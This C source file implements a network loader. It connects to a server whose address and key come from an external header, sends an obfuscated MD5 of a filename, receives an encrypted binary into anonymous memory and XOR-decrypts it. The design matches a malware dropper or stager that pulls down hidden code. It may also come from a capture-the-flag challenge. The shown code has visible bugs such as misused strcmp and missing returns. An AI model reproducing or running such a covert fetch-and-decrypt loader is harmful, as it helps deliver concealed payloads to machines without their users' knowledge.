#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include "../env.h"
#include <stdarg.h>
#include "md5.c"

// void // log_info(char *fmt, ...) {
//     if (DEBUG) {
//         va_list args;
//         va_start(args, fmt);
//         vprintf(fmt, args);
//         va_end(args);
//     }
//     return;
// }

void decrypt_binary(char *binary, int size) {
    // log_info("Decypting binary with size %d\n", size);
    for (unsigned long i = 0; i < size; i++) {
        binary[i] = binary[i] ^ (((((i << 4) + 97436)) ^ 0x69) & 0xff);
    }
    return;
}

char *get_binary(char *remote_fn) {
    // connect to server, send the key 8 bytes and receive the binary
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    serv_addr.sin_addr.s_addr = inet_addr(IP);
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    char key[] = KEY;
    send(sockfd, key, strlen(key), 0);

    char encoded_fn[16];
    md5String(remote_fn, &encoded_fn);
    for (int i = 0; i < 15; i++) 
        encoded_fn[i] = encoded_fn[i] ^ encoded_fn[15] ^ ((69 + (i << 7) * 1543453) % 256);

    send(sockfd, encoded_fn, 16, 0);

    int ans[3] = {0, 0, 0};
    ans[0] = 0;
    ans[1] = 0;

    // get size, if size if 0x6969, then the key is invalid
    recv(sockfd, ans, 2, 0);
    if (strcmp(ans, "\x69\x69") == 0) {
        // log_info("Invalid key\n");
        close(sockfd);
        return;
    }
    int size = 0, crt = 0;
    size = ans[0];
    size = ((size & 0xff) << 8) | ((size & 0xff00) >> 8);

    // receive the binary
    char *binary = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    *binary = size & 0xff;
    *(binary + 1) = (size >> 8) & 0xff;
    binary += 8;
    while (crt < size) {
        int bytes = recv(sockfd, binary + crt, size - crt, 0);
        // log_info("Received %d bytes\n", bytes);
        crt += bytes;
    }
    // log_info("Binary received\n");
    decrypt_binary(binary, size);
    // log_info("Binary decrypted\n");
    close(sockfd);

    return binary - 8;
}

int only_digits(char *str) {
    for (int i = 0; i < strlen(str); i++) {
        if (!isdigit(str[i])) {
            return 0;
        }
    }
    return 1;
}